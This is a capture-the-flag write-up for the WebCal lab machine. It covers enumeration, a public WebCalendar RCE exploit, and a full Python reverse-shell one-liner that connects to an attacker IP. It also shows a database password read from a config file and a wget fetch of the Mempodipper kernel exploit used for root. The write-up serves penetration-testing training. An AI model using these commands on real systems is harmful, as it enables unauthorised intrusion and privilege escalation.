---
description: Writeup for WebCal from Offensive Security Proving Grounds (PG)
---

# WebCal

## Information Gathering

### Service Enumeration

`nmapAutomator.sh -H 192.168.66.37 -t full`

![](../../.gitbook/assets/3af61e400c594392bd79c8ab1f9fb8d8.png)

`nmapAutomator.sh -H 192.168.66.37 -t vulns`

![](../../.gitbook/assets/e2f62497e8794c54a9b09622bfa5aebc.png)

![](../../.gitbook/assets/b646b002be034d1c994d281a253c8595.png)

### HTTP

![](../../.gitbook/assets/eec0eca2638148bf923d427329916abb.png)

`gobuster dir -u http://192.168.66.37/ -w /usr/share/dirb/wordlists/common.txt -k -x .txt,.php --threads 50`

![](../../.gitbook/assets/0429b7f13a944fa3a648c019980f37c7.png)

* /resources
* /send
* /webcalendar

We find a login page at `http://192.168.66.37/webcalendar/login.php`.

![](../../.gitbook/assets/78de1e60b6414506a0ad3d3e7d54bc44.png)

The version is v1.2.3

## Exploit

WebCalendar &lt;= v1.2.4 suffers from an RCE vulnerability: [https://www.exploit-db.com/exploits/18775](https://www.exploit-db.com/exploits/18775)

Simply running the exploit above gives us RCE. `php 18775.php 192.168.66.37 /webcalendar/`

![](../../.gitbook/assets/8977a6a9c0ac46499940a756c072ec7d.png)

Once here, we can use a Python payload to catch a reverse shell on our Kali machine.

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.66",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`

![](../../.gitbook/assets/c4bba3402d714ca3a88cc8d3d09121cf.png)

On our Kali machine:

![](../../.gitbook/assets/8a0406a755c44e44a52e901c12bd9190.png)

![](../../.gitbook/assets/f3702a7cf9ad455da6df239e8298126b.png)

## Privilege Escalation

### MySQL

The `settings.php` file looks interesting.

![](../../.gitbook/assets/00f3d4c81f3048829db8819f979d5855.png)

Upon further inspection, the MySQL database credentials are in this file.

![](../../.gitbook/assets/445285c4d569403cb175567209d6bc79.png)

Furthermore, we now have access to port 3306, which is the MySQL port.

![](../../.gitbook/assets/724b343fa230482b9c35d9ef90ec297b.png)

```text
www-data@ucal:/home$ mysql --user=wc --password 
Enter password: edjfbxMT7KKo2PPC
```

![](../../.gitbook/assets/f7269c70496846ffa17cd9ba79c79d96.png)

![](../../.gitbook/assets/db91a3c3fe1d41fa8c82372e88a3f1ee.png)

### Kernel Exploit

The kernel version 3.0.0 is vulnerable to an exploit called Mempodipper.

![](../../.gitbook/assets/92ac0c212dde43ffac643a06f9faa240.png)

Compile: `gcc mempodipper.c -o mempodipper`

Transfer: `wget "192.168.49.66/mempodipper" -O mempodipper`

![](../../.gitbook/assets/389c736476d54a88b1cf246057784dc4.png)

![](../../.gitbook/assets/d214e7915ef24d1d94ff05ac13f15f04.png)

